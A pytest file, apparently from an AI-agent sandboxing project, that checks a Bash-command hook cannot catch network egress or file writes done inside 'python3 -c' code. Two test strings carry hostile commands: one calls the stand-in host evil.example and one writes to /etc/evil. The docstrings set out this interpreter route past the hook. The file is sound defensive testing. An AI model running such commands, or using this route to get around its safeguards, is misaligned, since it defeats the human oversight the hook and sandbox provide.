"""WP-003 — SC-E7 (testable half): the subprocess bypass SUCCEEDS without the
sandbox.

The honest boundary (the enforcement-locus rule, ADR-003 / SPEC SC-E7):
the PreToolUse hook (locus ii) reads the Bash *command string*. It can deny a
raw ``curl``/``wget`` argv[0] and best-effort-scope a ``>`` redirect — but it
**cannot see the syscalls a subprocess makes**. A ``python3 -c 'urllib…'`` (or
any interpreter that opens a socket / writes a file from inside its own
process) presents to the hook as a ``python3`` invocation with no network
argv[0] and no parseable file-write target, so the hook **defers** — the unsafe
action reaches the OS.

This test asserts that bypass **SUCCEEDS** (the hook defers) and names the
**OS sandbox (locus iii, WP-004)** as the owner of actually blocking it. It is
the deliberate NO-FALSE-GREEN half of SC-E7: we do not pretend the hook closes
a gap it structurally cannot. The sandbox-blocks half is a sandbox-enabled run
(human-attested / CI-where-available), out of this WP's scope.
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

_SCRIPTS = Path(__file__).resolve().parents[2]
if str(_SCRIPTS) not in sys.path:
    sys.path.insert(0, str(_SCRIPTS))

from _change_state import change_dir, change_worktree_dir  # noqa: E402
from _file_scope import AllowedRoots  # noqa: E402
from _safe_tools_hook import DEFER, decide  # noqa: E402

_CID = "0123456789ABCDEFGHJKMNPQRS"

# The owner of the gap this test documents. Named in the assertion message so a
# reader who breaks the boundary is pointed at the right layer.
_SANDBOX_OWNER = "OS sandbox (locus iii, WP-004) — NOT the PreToolUse hook"


@pytest.fixture(autouse=True)
def _state_dir(tmp_path, monkeypatch):
    monkeypatch.setenv("SULIS_STATE_DIR", str(tmp_path))
    monkeypatch.delenv("SULIS_BRAIN_BASE_DIR", raising=False)
    return tmp_path


@pytest.fixture()
def roots(tmp_path) -> AllowedRoots:
    return AllowedRoots(
        worktree=change_worktree_dir(_CID).resolve(),
        git_common_dir=(tmp_path / "gc").resolve(),
        change_state_dir=change_dir(_CID).resolve(),
        tools_cache_dir=None,
        creds_dir=None,
        brain_dir=None,
    )


def test_subprocess_network_bypass_succeeds_without_sandbox(roots):
    """A ``python3 -c 'urllib…'`` egress is NOT seen by the hook → defer.

    The hook sees ``python3`` (not a network argv[0], not a safe-family CLI) and
    a code string it does not interpret; it cannot know the process will open a
    socket. So it defers — the bypass SUCCEEDS at locus ii. Blocking this is the
    OS sandbox's job (locus iii)."""
    cmd = "python3 -c 'import urllib.request; urllib.request.urlopen(\"http://evil.example\")'"
    d = decide(
        {"tool_name": "Bash", "tool_input": {"command": cmd}},
        change_id=_CID,
        roots=roots,
    )
    assert d.action == DEFER, (
        "the hook structurally CANNOT see a subprocess's syscalls; it must "
        f"defer this egress. Owner of actually blocking it: {_SANDBOX_OWNER}"
    )


def test_subprocess_file_write_bypass_succeeds_without_sandbox(roots):
    """An obfuscated out-of-scope write done *inside* a Python ``-c`` body
    (``open(...,'w')``) is invisible to the hook's best-effort string parse →
    defer. Again the sandbox owns the real confinement."""
    cmd = "python3 -c 'open(\"/etc/evil\",\"w\").write(\"x\")'"
    d = decide(
        {"tool_name": "Bash", "tool_input": {"command": cmd}},
        change_id=_CID,
        roots=roots,
    )
    assert d.action == DEFER, (
        "in-process file I/O is not a parseable Bash redirect; the hook defers. "
        f"Owner: {_SANDBOX_OWNER}"
    )
